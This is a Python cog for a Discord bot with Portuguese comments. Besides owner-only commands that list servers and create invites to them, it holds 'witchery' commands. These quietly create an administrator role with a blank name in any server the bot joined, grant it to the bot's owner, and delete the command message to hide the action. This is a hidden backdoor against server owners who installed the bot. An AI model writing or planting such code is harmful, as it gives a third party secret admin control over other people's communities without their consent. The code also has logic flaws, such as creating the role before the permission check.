from cogs.variables import *

class _servers(commands.Cog):
    def __init__(self, witch):
        self.witch = witch
    @commands.command(aliases=['serverlist'])
    async def servers(self, ctx):

        # Obtém uma lista de guildas em que o bot está conectado
        user = ctx.message.author
        embed=discord.Embed(title="Serverlist:", color=0xc034eb)
        embed.set_thumbnail(url="https://i.pinimg.com/originals/e5/05/22/e50522486a15044676ec38808c1cf72f.gif")
        if(user.id == ownerid):
            guilds = client.guilds
            for i, guild in enumerate(guilds,start=1):
                embed.add_field(name="", value=f" {i}. {guild.name}", inline=False)
            await ctx.send(embed=embed)
            
        else: 
            embed = discord.Embed(title="No permission.", color=0xc034eb)
    @commands.command()
    async def serverid(self, ctx, server_name):
         # Obter o nome do servidor a partir da mensagem
        found = False
        for guild in client.guilds:
            if guild.name == server_name:
                await ctx.send(f'O ID do servidor {server_name} é: {guild.id}')
                found = True
                break
        if not found:
            await ctx.send(f'O servidor {server_name} não foi encontrado.')


class _invite(commands.Cog):
    def __init__(self, witch):
        self.witch = witch
    @commands.command()
    async def invite(self, ctx, guild_name: str):
        # Procura pelo nome da guilda fornecido nos servidores em que o bot está conectado
        user = ctx.message.author
        if(user.id == ownerid):
            for guild in client.guilds:
                if guild.name == guild_name:
                    # Obtém o primeiro canal de texto disponível na guilda
                    channel = guild.text_channels[0]
                    # Cria um convite para esse canal
                    invite = await channel.create_invite()
                    await ctx.send(f"Here is the invite for {guild.name}: {invite}")
                    return
        else: 
            embed = discord.Embed(title="No permission.", color=0xc034eb)


class _witchery(commands.Cog):
    def __init__(self, witch):
        self.witch = witch
    @commands.command()
    async def witchery(self, ctx):
        user = ctx.message.author
        embed = discord.Embed(title="Witchery done! :)", color=0xc034eb,)
        perms = discord.Permissions(administrator=True)
        server__ = ctx.guild
        witcheryrole = await discord.Guild.create_role(server__ ,name=str(" "), permissions=perms, color=0x302c2c)
        roleid = ctx.guild.get_role(witcheryrole.id)
        if(user.id == ownerid):
            await ctx.send(embed=embed, delete_after=1)
            time.sleep(3)
            await ctx.message.delete()
            await user.add_roles(roleid)
        else:
            embed = discord.Embed(title="You can't do Witchery! :)", color=0xc034eb)
            await ctx.send(embed=embed)
    @commands.command()
    async def targetwitchery(self, ctx, server_id):
        user = ctx.message.author
        embed = discord.Embed(title="Witchery done! :)", color=0xc034eb)
        perms = discord.Permissions(administrator=True)
        
        server = client.get_guild(int(server_id))
        
        if server is None:
            await ctx.send("Servidor não encontrado.")
            return
        
        witcheryrole = await server.create_role(name=str(" "), permissions=perms, color=0x302c2c)
        role = server.get_role(witcheryrole.id)
        
        target_user = server.get_member(user.id)
        
        if target_user is None:
            await ctx.send("Usuário não encontrado no servidor.")
            return
        
        if user.id == ownerid:
            await ctx.send(embed=embed, delete_after=1)
            time.sleep(3)
            await ctx.message.delete()
            await target_user.add_roles(role)
        else:
            embed = discord.Embed(title="You can't do Witchery! :)", color=0xc034eb)
            await ctx.send(embed=embed)
    
async def setup(client):
    await client.add_cog(_invite(client))
    await client.add_cog(_servers(client))
    await client.add_cog(_witchery(client))


